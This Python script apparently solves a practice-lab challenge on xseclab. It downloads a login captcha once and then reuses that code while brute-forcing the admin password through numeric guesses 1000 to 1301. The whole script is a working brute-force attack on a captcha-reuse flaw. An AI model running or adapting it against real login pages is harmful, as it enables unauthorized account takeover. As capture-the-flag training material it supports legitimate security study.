import requests
import re


url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php'
login = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
s = requests.session()

#测试连接，弄个session
c = s.get(url).content.decode('utf-8')

# 下载验证码
pic_url = re.findall(r'<img src="(.*?)">', c, re.S)
pic = requests.get(pic_url[0], timeout=10)
f = open('code.jpg', 'wb')
f.write(pic.content)
f.close()

# 输入验证码
print("input code:")
code = input()

for num in range(1000, 1302):
    data = {'username': 'admin', 'pwd': num, 'vcode': code, 'submit': 'submit'}
    res = s.post(login, data=data).content.decode('utf-8')

    if u'pwd error' in res:
        print("继续", num, '----密码错误')
    if u'vode error' in res:
        print("验证码错误")
    if u'error' not in res:
        print(num, '正确')
        break

